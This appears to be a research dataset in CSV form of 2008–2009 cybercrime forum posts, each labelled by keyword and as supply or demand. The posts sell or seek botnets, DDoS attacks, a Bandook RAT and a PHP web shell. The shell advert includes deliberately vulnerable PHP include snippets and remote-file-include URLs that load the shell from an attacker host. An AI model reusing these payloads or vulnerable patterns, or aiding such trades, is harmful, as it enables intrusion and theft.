content,tstamp,matching_terms,category
selling botnet zombies i'm selling a botnet 150 infected computers from europe it's running on a 10gb vps server on a secured hosting which dont cares about a botnet it cost $30 € 18 per month the rbot features then i could make some screenshot for you paying method moneybookers cost everything for $90 screenshot pm me if you are interested,2008-05-03 12:51:00+00:00,['botnet'],supply
i want to buy a botnet i am paying 0 20$ for each bot you botnet has,2009-04-16 02:19:00+00:00,['botnet'],demand
i want to buy a botnet i want to buy a botnet i pay 0 15$ for each bot,2009-04-18 01:48:00+00:00,['botnet'],demand
selling fud copies of bandook rat 6 months updates the title explains it all features are as follows main features list of the program firewall bypass method fwb code injection api unhook kernel patch reverse connection all traffic through one port safe thread based client persistance irremovable rootkit plugins based server 30 kb packed very friendly graphical user interface different installation paths png jpeg compressions for screencapture and webcam managing features filemanager with all types of functions including folder mirror rar folder files file search infect files multiple files download upload download upload manager registry editor with all type of functions process manager shows full path and modules manager windows manager including a send key function services manager connection features socks 4 proxy http https proxy port redirection tcp tunnel http web server ftp server remote shell flooding mailbomb ddos attacks spying features screen manager with screen clicks cam manager that supports system with multiple cams mic manager record voice from microphone ims spy msn yahoo aim keylogger live offline keylogger colored html live passwords ims spy with automatic delivery to ftp cached pws fetcher 6 embended pws plugins vnc remote desktop live control site detection check all your computers and know which one visits a specific site clipboard manager information about the remote machine cache reader screen recorder record the user activities on the screen into avi movies others shutdown menu nuclear fun agent fun download from web mass download selection download visit site undetected from anti virus vista support all features works on vista unicode support arabic chinese etc translatable interface currently available in over 10 languages file resume support in file manager network manager shares embedded pws grabbing support and upgrades works on limited user accounts undetected from anti virus vista support all features works on vista unicode support arabic chinese etc translatable interface currently available in over 10 languages file resume support in file manager network manager shares embedded pws grabbing support and upgrades works on limited user accounts lots of bug fixes and a lots of additions lots of bug fixes and a lots of additions if you want it pm me your price this is fud and will remain so for 6 months this costs over $300 usd new,2009-05-27 09:35:00+00:00,['ddos'],supply
selling up to 300 bots $0 50 each hello i am selling up to 300 bots zombies for $0 50 each pm me if you want to make a deal i may be able to sell for less here is a screenshot of my botnet img http img37 imageshack us img37 7914 botneth png img i am getting more and more every day so i may be able to sell even more than 300 if you would like to buy please pm me good rep or posts or l33t only please,2009-05-30 05:07:00+00:00,['botnet'],supply
looking for real ddos botnet hello i am looking for guy work with me who have real ddos power to fight my enemies they killed my servers so i have to teach them i can provide you rdp root for bots if you want it will not stop or i'll pay for you monthly salary if you want you have to know about ip spoofing my targets allowed only 1 country traffic i can provide you with all isps ip's for that country all udp attack blocked from routers target located us dedicated servers payment method w u paypal serious attacker please pm me sorry i am new member so i can't reply to pm msgs just give me your yahoo id or aim or msn to make good deal thanks,2009-06-11 12:52:00+00:00,"['botnet', 'ddos']",demand
ddos services i would like someone to be my ddos'er for me i can pay in game keys edit dna when you read this fuck yourself and its not for the vent,2009-06-18 08:02:00+00:00,['ddos'],demand
setup a rat botnet keylogger or anything i need someone who can setup something like which capture screenshots but it should be customly made in such a way that it capture screens only when a specified process is running or else it doesnt capture i am ready to pay for it so start giving me ur service p,2009-06-20 03:57:00+00:00,['botnet'],demand
selling moshell moshell it's a new php shell with improbable possibilities optimized to be fully workable using the nclude bug doest'n need uploading itself to server able to function as ddos bot for use http bugger bug php include moshell php dxmode ddos s php code for eval all functions including download files and authentification work in the remote include conditions even if bug php has fucked up the whole output for example outputs some error messages before shell is included supports gzip for downloading files hacker has an authentification mechanisms for enemy not to intrude cares about not viewing unnecessary info turn javascript on lite mode for weak connection optimized for opera but with ie kill him everything's also okay graphic ui in the sigle file all gif s are manually optimized self delete function features dir listing the folders all info about files and permissions including sticky bit lite mode for fast surfing handy mouse navigation show absolute and relative paths from dir mode also available make file directory uploading files form ftp http if failed file is left in tmp chmod view edit delete rename move download download with gzip ftp here is combined downloading http downloading uploading ftp sql mysql functions table list is always on top multi querys search all the tables for example log cleaning downloading affected rows in csv dump table php eval console some useful preset scripts cookie editing cookies making own cmd system commands some useful preset mail mail functions flood spam modes str trancecoding md5 sha1 crc32 base64 hex url portscan portscaner everything's editable scanning of main ports list of well known daemons sock manual work with sockets fsockopen html plaintext output modes proxy in browser http proxy headers forgery user agent referer support of post and cookie u can test it with 2 simple php's bug1 php php if isset $ get 'a' $ get 'b' $ get 'c' die 'params are dead ' just to be sure necessary params are preserved by the shell include $ get 's' bug2 php php print str repeat ' shit ' 100 if isset $ get 'a' $ get 'b' $ get 'c' die 'params are dead ' include $ get 's' http site path bug1 php a this b must be c preserved s http hacker moshell php http site path bug2 php a this b must be c preserved s http hacker moshell php contact me via pm,2009-07-05 09:19:00+00:00,['ddos'],supply
buying botnet i am buying around 300 bots hit me up on aim if your interested aim fook itz legacy,2009-07-10 08:15:00+00:00,['botnet'],demand
